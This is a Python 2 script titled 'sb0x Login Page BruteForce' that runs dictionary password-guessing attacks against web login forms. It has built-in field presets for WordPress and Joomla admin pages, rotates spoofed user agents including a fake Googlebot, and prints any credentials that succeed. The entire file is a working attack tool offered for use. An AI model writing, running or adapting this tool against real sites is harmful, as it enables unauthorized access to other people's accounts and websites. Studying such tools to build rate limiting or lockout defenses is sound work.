#!/usr/bin/env python
#-*-coding:utf-8 -*-
#  Copyright 2013 levi0x0 Project SiteBreaker0x
#  
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
###########################

import urllib
import urllib2
from re import search
from random import choice
import sys

#this is ONLY TEST VERSION THE FULL VERSION (01/08/2013)

#logo
logo = '''                            
		        #       mmmm        
		  mmm   #mmm   m"  "m m   m 
		 #   "  #" "#  #  m #  #m#  
		  """m  #   #  #    #  m#m  
		 "mmm"  ##m#"   #mm#  m" "m                    
'''

#banner
def banner():
  print "\t+------------------------------------------+"
  print logo
  print "\t\tsb0x Login Page BruteForce"
  print "\t\t USE IT at YOUR OWN RISK!"
  print "\t    (httPS://youtube.com/levi0x0) 2013"
  print "\t+-----------------------------------------+"
  
#help
def help():
  print "\nsb0x Login Page BruteForce by levi0x0 (httPS://youtube.com/levi0x0)"
  print "Options:\r"
  print "\t -h, --help dispaly help options."
  print "\t -v, --verbose	verbose mode."
  print "\t -V, --VERSION	display file verison."
  print "\nUsage:"
  print "\t%s <target> <password file>\n" % (sys.argv[0])
  print "\t%s <target> <password file> -v\n" % (sys.argv[0])
    
  
#Version
version = '1.5.2'
  
  
#Random UserAgent
user_agent = ["Mozilla/5.0 (Google bot http://google.com/bot.html)",
              "Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1)",
	          "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
		      "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/533.2",
		      "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.7.6) Gecko/20050512 Firefox"]	

 #Main Function        
def main(  target, user_tag, user, pass_tag, passwords, submit_tag, submit, log_err ):
	
	values = { user_tag : user, pass_tag : passwords, submit_tag: submit  }
	   
	data = urllib.urlencode( values )
	
	req = urllib2.Request( target, data )

	req.add_header('User-Agent', choice(user_agent) )
	
	req.add_header('Accept', 'text/html')

	req.add_header('Accept-Language', 'en-US')
	
	req.add_header('Accept-Encoding', 'gzip, deflate')

	req.add_header('DNT', 1)

	response = urllib2.urlopen( req ).read()
	
	if search( log_err, response ):
		if verbose:
			print "==>User: %s Password: %s |Login Faild!" % ( user, passwords )
		else:
			pass
	elif search( log_err, response ) == None:
		print "\n* Login Found!"
		print "[+]User: %s" % (user)
		print "[+]Password: %s\n" % (passwords)
		print "\nsb0x Login Page BruteForce by levi0x0 (httPS://youtube.com/levi0x0)\n"
		quit()
	else:
		print "[-]ERROR try again...."
		sys.exit()
		
for arg in sys.argv:
	if arg == "--help" or arg =="-h":
	  help()
	  sys.exit()
	elif arg == "--VERSION" or arg == "-V":
	    print "Version:%s" % version
	    sys.exit()
	elif arg == "--verbose" or arg == "-v":
		verbose = True
	else:
		verbose = False

try:
	target = sys.argv[1]
	passwords = sys.argv[2]

except:
	print "sb0x Login Page BruteForce by levi0x0 (httPS://youtube.com/levi0x0)\n"
	print "[!]Usage: %s <target> <Dictionary File>\n" % (sys.argv[0])
	sys.exit()


banner()
#t=values
WordPress = False

Joomla = False

Unk = True

ask = raw_input("[$]CMS (wordpress,joomla,None):")

if ask == "wordpress" or ask == "WORDPRESS" or ask == "Wordpress":
	WordPress = True

elif ask == "joomla" or ask == "JOOMLA" or ask == "Jommla":
	Joomla = True

else:
	Unk = True

if WordPress:
	user_tag = "log"
	user = raw_input("* UserName (admin):") or "admin"
	pass_tag = "pwd"
	submit_tag = "wp-submit"
	submit = "Log+In"
	log_err = raw_input("* Login error:")

elif Joomla:
	user_tag = "username"
	user = raw_input("* UserName (admin):") or "admin"
	pass_tag = "passwd"
	submit_tag = "submit"
	submit = "Log+In"
	log_err = raw_input("* Login error:")

else:
	user_tag = raw_input("* User TAG:")
	user = raw_input("* UserName (admin):") or "admin"
	pass_tag = raw_input("* Password TAG:")
	submit_tag = raw_input("* Submit TAG:")
	submit = raw_input("* Submit Value:")
	log_err = raw_input("* Login error:")
	
	
try:
  files = open(passwords, 'r')
  
except IOError:
  print "[!]ERROR file: %s NOT FOUND Try Again!" % sys.argv[2]
  sys.exit()

passw = files.readlines()

print "\n[*] Target: %s" % (target)

print "[*] loaded Words: %d" % (len(passw))

if verbose:

	print "[*] Verbose mode: ON"

else:
	print "[*] Verbose Mode: OFF"

if user_tag == "log" and pass_tag == "pwd" and submit_tag == "wp-submit":
	print "[*] CMS:Wordpress\n"
else:
	print "[*] CMS :Unknown\n"

try:
	for p in passw:
		main( target, user_tag, user, pass_tag, p.replace('\n', ''), submit_tag, submit, log_err)
	print "\n[!]Done.."
	sys.exit()
except KeyboardInterrupt:
	print "[-]bye (:"
	sys.exit()

except:
	print "[-]got error! ):"
	sys.exit()
#!EOF
